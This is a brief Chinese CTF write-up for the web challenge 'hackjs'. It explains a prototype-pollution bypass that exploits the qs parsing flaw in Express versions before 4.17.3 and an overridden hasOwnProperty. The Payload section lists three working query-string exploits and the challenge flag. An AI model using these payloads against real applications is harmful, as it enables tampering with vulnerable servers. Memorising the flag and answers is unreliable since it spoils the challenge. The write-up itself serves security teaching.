# Web - hackjs

**考察点：**qs数组原型链污染,hasOwnProperty覆盖

**预估难度：**简单

**解题思路：**

* 审计代码可知，题目限制了venom的key小于3个并且welcome需要等于159753，且text为flag。因此需要venom[text]=flag&venom[welcome]=159753。
* 现在需要程序抛出异常进入异常块，覆盖hasOwnProperty为任意字符即可抛出异常：venom[text]=flag&venom[welcome]=159753&venom[hasOwnPropert]=1。
* 此时key为3，观察express版本为4.17.2，express@(-∞, 4.17.3)中依赖的qs模块存在数组原型污染漏洞。因此我们随便选取一个参数污染数组原型即可得到flag。

Payload：
```
1. venom[__proto__][text]=flag&venom[welcome]=159753&venom[hasOwnProperty]=1
2. venom[__proto__][welcome]=159753&venom[text]=flag&venom[hasOwnProperty]=1
3. venom[__proto__][hasOwnProperty]=1&venom[welcome]=159753&venom[text]=flag
```
参考链接：
1. [记ByteCTF中的Node题 ](https://www.cnblogs.com/WindrunnerMax/p/15686924.html)
2. [第一届 “东软杯”网络安全CTF竞赛-官方WriteUp](https://xz.aliyun.com/t/10642)
3. [[Fix] parse: ignore __proto__ keys](https://github.com/ljharb/qs/commit/ba24e74dd17931f825adb52f5633e48293b584e1)

	*flag:**	flag{just_wa3m_up_but_o1d_qs_1s_vulnerable!!}

**作者：**Squirt1e